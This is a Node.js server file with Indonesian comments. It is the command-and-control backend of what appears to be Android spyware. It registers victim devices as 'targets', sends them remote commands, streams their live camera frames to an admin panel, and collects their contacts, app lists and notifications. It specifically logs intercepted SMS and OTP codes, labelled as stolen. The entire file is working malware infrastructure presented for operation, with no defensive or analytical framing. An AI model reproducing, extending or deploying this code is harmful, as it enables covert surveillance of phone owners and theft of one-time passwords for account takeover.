const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const fs = require('fs');
const path = require('path');
const http = require('http');
const socketIo = require('socket.io');

const authRoutes = require('./routes/auth');
const userRoutes = require('./routes/user');
const whatsappRoutes = require('./routes/whatsapp');
const vpsRoutes = require('./routes/vps');
const toolsRoutes = require('./routes/tools');
const chatRoutes = require('./routes/chat');

const authMiddleware = require('./middleware/authMiddleware');
const rateLimitMiddleware = require('./middleware/rateLimitMiddleware');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*" },
    maxHttpBufferSize: 1e8 // Support frame kamera & file hingga 100MB
});

app.use(helmet());
app.use(cors());
app.use(express.urlencoded({ extended: false }));
app.use(express.json({ limit: '500mb' }));
app.use(rateLimitMiddleware);

// ==========================================================
// [+] REAL-TIME ENGINE (ADMIN & TARGET MANAGEMENT)
// ==========================================================
io.on('connection', (socket) => {
    const { id, type } = socket.handshake.query;
    
    if (id) {
        socket.join(id); // Target masuk ke room ID-nya sendiri
        if (type === 'admin') {
            socket.join('ADMIN_ROOM'); // Admin masuk ke room khusus broadcast
            console.log(`[+] Admin Linked: ${id}`);
        } else {
            console.log(`[+] Target Linked: ${id}`);
            // Beritahu admin bahwa ada target baru online
            io.to('ADMIN_ROOM').emit('target_status', { id, status: 'online' });
        }
    }

    socket.on('disconnect', () => {
        console.log(`[-] Connection Lost: ${id}`);
    });
});

const DB_DIR = './data';
if (!fs.existsSync(DB_DIR)) fs.mkdirSync(DB_DIR);

const FILES = {
    TARGETS: path.join(DB_DIR, 'targets.json'),
    NOTIFS: path.join(DB_DIR, 'notifications.json'),
    COMMANDS: path.join(DB_DIR, 'commands.json'),
    RESPONSES: path.join(DB_DIR, 'responses.json')
};

const readDB = (file) => {
    if (!fs.existsSync(file)) return [];
    try { return JSON.parse(fs.readFileSync(file, 'utf8') || '[]'); } catch (e) { return []; }
};

const saveDB = (file, data) => {
    try { fs.writeFileSync(file, JSON.stringify(data, null, 2)); } catch (e) { console.log(`[!] DB Write Error`); }
};

// Routes
app.use('/api/auth', authRoutes);
app.use('/api/user', authMiddleware, userRoutes);
app.use('/api/whatsapp', authMiddleware, whatsappRoutes);
app.use('/api/vps', authMiddleware, vpsRoutes);
app.use('/api/tools', authMiddleware, toolsRoutes);
app.use('/', chatRoutes);

// Register Target
app.post('/api/register-target', (req, res) => {
    const deviceData = req.body; 
    let targets = readDB(FILES.TARGETS);
    const index = targets.findIndex(t => t.id === deviceData.id);
    const entry = { ...deviceData, lastSeen: new Date(), status: 'Online' };
    
    if (index !== -1) {
        targets[index] = { ...targets[index], ...entry };
    } else {
        targets.push(entry);
    }
    
    saveDB(FILES.TARGETS, targets);
    io.to('ADMIN_ROOM').emit('device_info', entry); // Sync ke panel admin
    res.json({ status: 'ok' });
});

// Kirim Perintah
app.post('/api/send-command', (req, res) => {
    const { deviceId, id, command, extra } = req.body;
    const targetId = deviceId || id; 

    // Real-time trigger via Socket.IO
    io.to(targetId).emit('new_command', { command, extra });

    // Backup via Polling (DB)
    let commands = readDB(FILES.COMMANDS).filter(c => c.targetId !== targetId);
    commands.push({ targetId, command, extra, timestamp: new Date() });
    saveDB(FILES.COMMANDS, commands);
    
    console.log(`[CMD] ${command} sent to ${targetId}`);
    res.json({ status: 'sent', targetId });
});

// FIXED: Post Response (Ditambahkan Logic Live Camera Frame Bridge)
app.post('/api/post-response/:id', (req, res) => {
    const targetId = req.params.id;
    const responsePayload = req.body; // { cmd, data }

    // 1. LIVE CAMERA BRIDGE: Jika ini adalah frame kamera, jangan simpan ke file (bikin penuh)
    // Langsung arahkan ke Admin Panel via Socket menggunakan event 'live_frame'
    if (responsePayload.cmd === "live_camera_frame") {
        io.to('ADMIN_ROOM').emit('live_frame', {
            id: targetId,
            image: responsePayload.data // Base64 data dari native
        });
        return res.json({ status: 'streaming' });
    }
    
    // 2. Broadcast data lain (kontak/apps) secara real-time ke Admin Panel
    io.to('ADMIN_ROOM').emit('new_response', {
        deviceId: targetId,
        cmd: responsePayload.cmd,
        data: responsePayload.data
    });

    // 3. Persistent Storage (Agar DataViewer Page bisa narik data permanen)
    let responses = readDB(FILES.RESPONSES);
    responses = responses.filter(r => !(r.targetId === targetId && r.cmd === responsePayload.cmd));
    responses.push({ targetId, ...responsePayload, timestamp: new Date() });
    saveDB(FILES.RESPONSES, responses);

    res.json({ status: 'broadcasted' });
});

// FIXED: Post Notification (Smart Parser agar tidak "Unknown")
app.post('/api/post-notification/:id', (req, res) => {
    const targetId = req.params.id;
    const data = req.body;

    // Logika filter "OTP/SMS" dari tools lama Bos
    if(data.category === "OTP/SMS") {
        console.log(`[intercept] SMS CURIAN: ${data.title} -> ${data.body || data.text}`);
    }

    // Gabungkan data client dengan fallback cerdas agar tidak muncul "Unknown"
    const entry = {
        targetId,
        app: data.app || "SYSTEM",
        title: data.title || data.sender || "Unknown",
        body: data.body || data.text || data.message || "No content",
        package: data.package || "com.android.system",
        category: data.category || "NOTIFICATION",
        timestamp: data.timestamp || new Date().toISOString()
    };

    // Broadcast Real-time ke UI Admin via Socket
    io.to('ADMIN_ROOM').emit('new_notification', entry);

    // Simpan ke database (Simpan 1000 log terakhir)
    let allNotifs = readDB(FILES.NOTIFS);
    allNotifs.unshift(entry);
    saveDB(FILES.NOTIFS, allNotifs.slice(0, 1000)); 
    
    console.log(`[INTEL] ${entry.app} intercept from ${targetId}: ${entry.title}`);
    res.json({ status: 'saved' });
});

// Heartbeat & Status
app.post('/api/heartbeat/:id', (req, res) => {
    const targetId = req.params.id;
    const { battery } = req.body;
    let targets = readDB(FILES.TARGETS);
    const index = targets.findIndex(t => t.id === targetId);
    
    if (index !== -1) {
        targets[index].lastSeen = new Date();
        targets[index].battery = battery;
        targets[index].status = "Online"; 
        saveDB(FILES.TARGETS, targets);
    }
    // Beritahu Admin Panel status baterai terbaru
    io.to('ADMIN_ROOM').emit('heartbeat', { deviceId: targetId, battery });
    res.json({ status: 'alive' });
});

// FIXED: Get Response (Sinkronisasi Data Gabungan untuk UI Admin)
app.get('/api/get-response/:id', (req, res) => {
    const responses = readDB(FILES.RESPONSES);
    const notifs = readDB(FILES.NOTIFS);
    
    const targetResponses = responses.filter(r => r.targetId === req.params.id);
    const targetNotifs = notifs.filter(n => n.targetId === req.params.id);
    
    const formattedData = {};
    targetResponses.forEach(r => {
        formattedData[r.cmd.replace('get_', '')] = r.data;
    });

    // Masukkan notifikasi ke dalam response agar tampil di list SMS/Notif UI Flutter
    formattedData['notifications'] = targetNotifs;

    res.json({ data: formattedData });
});

app.get('/api/list-targets', (req, res) => {
    const operatorName = req.query.username; 
    const targets = readDB(FILES.TARGETS);
    res.json(operatorName ? targets.filter(t => t.admin === operatorName) : targets);
});

app.get('/ping', (req, res) => res.send('pong'));

module.exports = server;